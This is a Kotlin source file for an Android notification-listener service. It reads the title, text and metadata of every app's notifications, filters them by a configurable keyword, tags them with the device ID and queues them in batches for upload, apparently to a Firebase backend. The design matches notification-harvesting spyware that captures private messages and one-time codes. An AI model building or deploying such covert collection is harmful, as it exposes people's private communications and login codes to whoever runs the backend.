package com.example.fast.service

import android.annotation.SuppressLint
import android.app.Notification
import android.content.Intent
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.example.fast.config.AppConfig
import com.example.fast.util.NotificationBatchProcessor
import com.example.fast.notification.AppNotificationManager
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.prexoft.prexocore.readInternalFile
import android.util.Log

class NotificationReceiver : NotificationListenerService() {
    private var deviceId = ""
    private var lastNotify = ""

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn?.isOngoing != false) return

        val pkg = sbn.packageName ?:return
        val title = sbn.notification?.extras?.getString(Notification.EXTRA_TITLE).toString()
        val text = sbn.notification?.extras?.getCharSequence(Notification.EXTRA_TEXT).toString()
        val time = sbn.postTime
        val extras = sbn.notification?.extras
        val extraInfo = mutableMapOf<String, Any?>(
            "key" to sbn.key,
            "id" to sbn.id,
            "tag" to sbn.tag,
            "postTime" to sbn.postTime,
            "when" to sbn.notification?.`when`,
            "category" to sbn.notification?.category,
            "channelId" to sbn.notification?.channelId,
            "groupKey" to sbn.groupKey,
            "overrideGroupKey" to sbn.overrideGroupKey,
            "isGroup" to sbn.isGroup,
            "isGroupSummary" to sbn.notification?.let { (it.flags and Notification.FLAG_GROUP_SUMMARY) != 0 },
            "priority" to sbn.notification?.priority,
            "visibility" to sbn.notification?.visibility,
            "flags" to sbn.notification?.flags,
            "tickerText" to sbn.notification?.tickerText?.toString(),
            "actionsCount" to sbn.notification?.actions?.size
        )
        if (extras != null) {
            extraInfo["titleBig"] = extras.getString(Notification.EXTRA_TITLE_BIG)
            extraInfo["subText"] = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()
            extraInfo["summaryText"] = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString()
            extraInfo["infoText"] = extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString()
            extraInfo["bigText"] = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
        }

        if (lastNotify == "$title : $text #$pkg") return
        lastNotify = "$title : $text #$pkg"

        val filter = readInternalFile("filterNotify.txt")

        // Check if notification sync is disabled
        if (filter == "~DISABLED~") {
            // Notification sync is disabled, don't process notifications
            return
        }

        if (filter.isNotEmpty()) {
            val filterType = if (filter.contains("~")) filter.split("~")[1] else "contains"
            val filterWord = filter.split("~")[0]

            when (filterType) {
                "contains" -> {
                    if (!text.contains(filterWord, true)) return
                }
                "containsNot" -> {
                    if (text.contains(filterWord, true)) return
                }
                "equals" -> {
                    if (text.lowercase() != filterWord.lowercase()) return
                }
                "equalsNot" -> {
                    if (text.equals(filterWord, ignoreCase = true)) return
                }
                "startsWith" -> {
                    if (!text.startsWith(filterWord, true)) return
                }
                "startsWithNot" -> {
                    if (text.startsWith(filterWord, true)) return
                }
                "endsWith" -> {
                    if (!text.endsWith(filterWord, true)) return
                }
                "endsWithNot" -> {
                    if (text.endsWith(filterWord, true)) return
                }
            }
        }
        
        // Queue notification for batch upload (uploads every 5 minutes or when 100 collected)
        // Format: "package~title~text"
        NotificationBatchProcessor.queueNotification(
            context = this,
            packageName = pkg,
            title = title ?: "",
            text = text?.toString() ?: "",
            timestamp = time,
            extra = extraInfo.filterValues { it != null }
        )
    }

    @SuppressLint("ForegroundServiceType", "HardwareIds")
    override fun onCreate() {
        super.onCreate()
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onDestroy() {
        super.onDestroy()
        // Flush any pending notifications before destroying
        NotificationBatchProcessor.flush(this)
        stopSelf()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
}
